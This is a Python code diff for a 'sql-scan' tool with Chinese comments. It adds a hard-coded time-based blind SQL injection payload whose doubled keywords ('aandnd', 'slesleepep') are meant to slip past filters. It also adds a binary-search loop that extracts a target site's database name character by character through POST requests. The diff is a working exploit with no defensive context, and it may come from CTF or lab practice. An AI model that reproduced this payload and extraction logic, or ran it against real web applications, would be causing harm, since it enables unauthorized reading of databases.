@@ -4,6 +4,7 @@ import requests
 import sys
 import argparse
 import re
+import time
 from bs4 import BeautifulSoup
 
 Version = "sql-scan Tool V1.0.0"
@@ -21,6 +22,9 @@ message="Logon failure"
 
 #要搜索的数据
 s_data="hello"
+
+#爆破ascii码值的payload
+payload_size="admin' aandnd iiff(asasciicii(subsubstrstr(database(),{},1))={},slesleepep(1),1)#"
 
 #get请求
 def get(url,payload):
@@ -78,33 +82,32 @@ def fuzz_len(url,method,data):
 
 #爆破ascii码值
 def fuzz_size(url,len,method,data):
-    with open('size.txt','r') as file:
-        for payload in file:
-            if data==None:
-                data =''
-            time = 1
-            if method =='get':
-                result = get(url,payload)
-            elif method =='post':
-                print("数据库名为:",end='')
-                while time <= len:
-                    low = 32
-                    high = 128
-                    mid = (high + low) // 2
-                    payload = payload.replace("len",str(time))
-                    while low < high:
-                        payload = payload.replace("size",str(mid))
-                        result = post(url,payload,data)
-                        if message in result:
-                            high = mid
-                        else:
-                            low += 1
-                        payload = payload.replace(str(mid),"size")
-                        mid = (low+high)//2
-                    print(chr(low),end='')
-                    result = post(url,payload,data)
-                    payload = payload.replace(str(time),"len")
-                    time += 1
+
+    if data==None:
+        data =''
+    time = 1
+    if method =='get':
+        result = get(url,payload)
+    elif method =='post':
+        print("数据库名为:",end='')
+        while time <= len:
+            low = 32
+            high = 128
+            mid = (high + low) // 2
+            #payload = payload.replace("len",str(time))
+            while low < high:
+                #payload = payload.replace("size",str(mid))
+                payload = payload_size.format(time,mid)
+                result = post(url,payload,data)
+                if message in result:
+                    high = mid
+                else:
+                    low += 1
+                #payload = payload.replace(str(mid),"size")
+                mid = (low+high)//2
+            print(chr(mid),end='')
+            #payload = payload.replace(str(time),"len")
+            time += 1
 
 
         
@@ -138,5 +141,9 @@ def main():
 
 
 if __name__=='__main__':
+    start_time = time.time()
     print(Logo,'\n')
     main()
+    end_time = time.time()
+    run_time = end_time - start_time
+    print("\n运行时间为："+str(run_time))
